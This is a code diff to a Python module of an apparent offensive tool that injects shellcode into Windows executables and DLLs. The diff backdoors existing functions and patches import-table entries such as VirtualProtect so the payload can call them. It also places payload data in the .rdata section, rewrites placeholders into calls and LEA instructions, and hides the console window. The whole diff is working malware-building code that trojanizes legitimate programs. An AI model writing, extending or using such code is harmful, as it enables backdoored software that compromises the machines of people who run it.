@@ -2,10 +2,10 @@ from helper import *
 import logging
 import time
 import logging
+from typing import Dict, List
 
 from model.carrier import Carrier, DataReuseEntry
 from pe.pehelper import *
-from model.exehost import *
 from observer import observer
 from pe.derbackdoorer import FunctionBackdoorer
 from pe.superpe import SuperPe
@@ -34,14 +34,29 @@ def inject_exe(
     # And check if it fits into the target code section
     main_shc = file_readall_binary(main_shc_path)
     shellcode_len = len(main_shc)
-    if shellcode_len + 128 > project.exe_host.code_section.Misc_VirtualSize:
+    code_sect_size = project.carrier.superpe.get_code_section().Misc_VirtualSize
+    if shellcode_len + 128 > code_sect_size:
         raise Exception("Error: Shellcode {}+128 too small for target code section {}".format(
-            shellcode_len, project.exe_host.code_section.Misc_VirtualSize
+            shellcode_len, code_sect_size
         ))
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
     function_backdoorer = FunctionBackdoorer(superpe)
+
+    # Patch IAT if necessary
+    if source_style == FunctionInvokeStyle.iat_reuse:
+        for iatRequest in project.carrier.get_all_iat_requests():
+            iat_name = superpe.get_iat_name_for("KERNEL32.dll", iatRequest.name)
+            superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
+
+        #iat_name_a = superpe.get_iat_name_for("KERNEL32.dll", "GetEnvironmentVariableW")
+        #iat_name_b = superpe.get_iat_name_for("KERNEL32.dll", "VirtualProtect")
+        #logger.info("Using: {} and {}".format(iat_name_a, iat_name_b))
+
+        #superpe.patch_iat_entry("KERNEL32.dll", iat_name_a, "GetEnvironmentVariableW")
+        #superpe.patch_iat_entry("KERNEL32.dll", iat_name_b, "VirtualProtect")
+        superpe.pe.parse_data_directories()
 
     shellcode_offset: int = 0  # file offset
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
@@ -109,8 +124,8 @@ def inject_exe(
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         if source_style == FunctionInvokeStyle.iat_reuse:
-            injected_fix_iat(superpe, project.carrier, project.exe_host)
-            injected_fix_data(superpe, project.carrier, project.exe_host)
+            injected_fix_iat(superpe, project.carrier)
+            injected_fix_data(superpe, project.carrier)
 
     # changes from console to UI (no console window) if necessary
     superpe.patch_subsystem()
@@ -129,31 +144,30 @@ def inject_exe(
     #    observer.add_code_file("exe_extracted_jmp", jmp_code)
 
 
-def injected_fix_iat(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
+def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
     """replace IAT-placeholders in shellcode with call's to the IAT"""
     code = superpe.get_code_section_data()
-
     for iatRequest in carrier.get_all_iat_requests():
         if not iatRequest.placeholder in code:
             raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
-        destination_virtual_address = exe_host.get_vaddr_of_iatentry(iatRequest.name)
+        offset_from_code = code.index(iatRequest.placeholder)
+        
+        # Note that the SuperPe may already have been patched for new IAT imports
+        destination_virtual_address = superpe.get_vaddr_of_iatentry(iatRequest.name)
         if destination_virtual_address == None:
             raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
         
-        offset_from_code = code.index(iatRequest.placeholder)
-        instruction_virtual_address = offset_from_code + exe_host.image_base + exe_host.code_section.VirtualAddress
+        instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
         logger.info("    Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
             iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
         ))
-        jmp = assemble_relative_call(
-            instruction_virtual_address, destination_virtual_address
-        )
+        jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
         code = code.replace(iatRequest.placeholder, jmp)
 
     superpe.write_code_section_data(code)
 
 
-def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
+def injected_fix_data(superpe: SuperPe, carrier: Carrier):
     """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
     # Insert my data into the .rdata section.
     # Chose and save each datareuse_fixup's addres.
@@ -163,11 +177,11 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
         return
     
     # Put stuff into .rdata section in the PE
-    peSection = exe_host.superpe.get_section_by_name(".rdata")
+    peSection = carrier.superpe.get_section_by_name(".rdata")
     if peSection == None:
         raise Exception("No .rdata section found, abort")
     
-    rm = exe_host.get_rdata_relocmanager()
+    rm = carrier.superpe.get_rdata_relocmanager()
 
     if True:  # FIXME this is a hack which is sometimes necessary
         sect_data_copy = peSection.pefile_section.get_data()
@@ -190,7 +204,7 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
         rm.add_range(hole[0], hole[1])  # mark it as used
         var_data = datareuse_fixup.data
         superpe.pe.set_bytes_at_offset(fixup_offset_rdata, var_data)
-        datareuse_fixup.addr = fixup_offset_rdata + peSection.virt_addr + exe_host.image_base - peSection.raw_addr
+        datareuse_fixup.addr = fixup_offset_rdata + peSection.virt_addr + carrier.superpe.get_image_base() - peSection.raw_addr
         logging.info("    Add data to .rdata at 0x{:X} (off: {}): {}".format(
             datareuse_fixup.addr, fixup_offset_rdata, var_data.decode('utf-16le')))
         fixup_offset_rdata += len(var_data) + 8
@@ -204,7 +218,7 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
                 datareuse_fixup.randbytes))
         
         offset_from_datasection = code.index(datareuse_fixup.randbytes)
-        instruction_virtual_address = offset_from_datasection + exe_host.image_base + exe_host.code_section.VirtualAddress
+        instruction_virtual_address = offset_from_datasection + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
         destination_virtual_address = datareuse_fixup.addr
         logger.info("    Replace {} at VA 0x{:X} with LEA {} .rdata 0x{:X}".format(
             datareuse_fixup.randbytes.hex(), instruction_virtual_address, datareuse_fixup.register, destination_virtual_address
